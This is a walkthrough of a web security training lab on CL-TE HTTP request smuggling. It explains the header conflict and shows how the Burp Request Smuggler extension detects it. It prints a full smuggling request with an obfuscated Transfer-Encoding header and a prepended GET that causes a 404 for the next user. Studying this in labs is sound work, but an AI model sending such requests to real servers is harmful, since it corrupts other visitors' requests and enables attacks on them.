### HTTP request smuggling
#### Basic information
+ HTTP request smuggling is a technique for interfering with the way a web site processes sequences of HTTP requests that are received from one or more users.
Most HTTP request smuggling vulnerabilities arise because the HTTP specification provides two different ways to specify where a request ends: the <b>Content-Length header (CL) and the Transfer-Encoding header(TE)</b>. 
The Transfer-Encoding header can be used to specify that the message body uses chunked encoding. This means that the message body contains one or more chunks of data.<br>
Since the HTTP specification provides two different methods for specifying the length of HTTP messages, it is possible for a single message to use both methods at once, such that they conflict with each other. The HTTP specification attempts to prevent this problem by stating that if both the Content-Length and Transfer-Encoding headers are present, then the Content-Length header should be ignored.<br>
If the front-end and back-end servers behave differently in relation to the (possibly obfuscated) <b>Transfer-Encoding header</b>, then they might disagree about the boundaries between successive requests, leading to request smuggling vulnerabilities. The following scenarios are possible:
1. CL-TE: the front-end server uses the Content-Length header and the back-end server uses the Transfer-Encoding header
1. TE-CL: the front-end server uses the Transfer-Encoding header and the back-end server uses the Content-Length header
1. TE-TE: the front-end and back-end servers both support the Transfer-Encoding header, but one of the servers can be induced not to process it by obfuscating the header in some way
#### Lab enviroment
In the lab the front-end server doesn't support chunked encoding. The application is also vulnerable to reflected XSS via the User-Agent header.
To solve the lab, smuggle a request to the back-end server that causes the next user's request to receive a response containing an XSS exploit that executes <b>alert(1)</b><br><i>Note: you must have HTTP Request Smuggler extention installed in Burp</i>
#### Steps
First we need to verify if the application is vulnerable to HTTP request smuggling (AKA desync attack), so lets proceed to analyze the request for a comment subsmission. 
First verify that the HTPP request smuggler extension is installed: click to Extension (1), then verify that the Smuggler is listed (2), eventually go BApp Store (3) and proceed to the installation. I suggest to set the Output (4) to Save to a file
-- 64 --
In the output we will get the report with the results of the externsion's execution.

Now lets proceed to use the HTTP Request Smuggler, to do that right-click into the Request body and choose Smuggle probe (click Ok in the configuration windows that appears, if you don't see the OK button just hit enter):
-- 65 --
Wait a couple of minute (or tail the file) to get the result that indicates that the application could be prone to CL-TE desyn vulnerability:
```
Updating active thread pool size to 8
Loop 0
Queued 1 attacks from 1 requests in 0 seconds
Unexpected report with response
Found issue: Possible HTTP Request Smuggling: CL.TE multiCase (delayed response)
Target: https://0a57004604fdbb11c0900dc7003c00ec.web-security-academy.net
Burp issued a request, and got a response. Burp then issued the same request, but with a shorter Content-Length, and got a timeout.<br/> 
This suggests that the front-end system is using the Content-Length header, and the backend is using the Transfer-Encoding: chunked header. 
You should be able to manually verify this using the Repeater, provided you uncheck the 'Update Content-Length' setting on the top menu. 
<br/>As such, it may be vulnerable to HTTP Desync attacks, aka Request Smuggling. 
<br/>To attempt an actual Desync attack, right click on the attached request and choose 'Desync attack'. 
Please note that this is not risk-free - other genuine visitors to the site may be affected.<br/>
...
```
As suggested we should be able to manually test the vulnerability using a payload provided in the report. Scrolling the result we can choose the following:
```
...
POST /post/comment HTTP/1.1
Host: 0a5a006c0402c03dc28a0626008b0066.web-security-academy.net
Cookie: session=mPoMTxbv2et0e1oSHkM0znnd5e8HAxOZ
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 353
Origin: https://0a5a006c0402c03dc28a0626008b0066.web-security-academy.net
Referer: https://0a5a006c0402c03dc28a0626008b0066.web-security-academy.net/post?postId=4
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close
tRANSFER-ENCODING: chunked

d2
csrf=mehaXubNbgLch7KliIBrrnEJX8LHness&userAgent=Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%3B+rv%3A108.0%29+Gecko%2F20100101+Firefox%2F108.0&postId=4&comment=ciao&name=zinz&email=zinz%40libero.it&website=
0

GET /?x=5u0ddwptlhzwzk0kkdjae3bt9kfc31/0a57004604fdbb11c0900dc7003c00ec.web-security-academy.net HTTP/1.1
Host: 52.16.21.24
Foo: x
...
```
Copy and paste the request into Reapeter, morover I modified the GET as follows (we have then to adjust the Content-Length in accords as shown in the next image):
```
GET /invalid_URL HTTP/1.1
Foo: x
```
Then the above two lines of the request should be treated by the back-end server as belonging to the next valid request that is received. Since this request contains an invalid URL, the server will respond with status code 404, indicating that the attack request did indeed interfere with it. Submitting the modified request we can notice that the server respond correctly with a redirect (1), but following the redirection (2), since our GET instruction was prepended to the subsequent request, will cause a 404 error trying to reach the invalid url
-- 66 --
Following the redirect:
-- 67 --



#### Reference
+ https://portswigger.net/web-security/request-smuggling
+ https://portswigger.net/web-security/request-smuggling/finding
+ https://portswigger.net/web-security/request-smuggling/exploiting

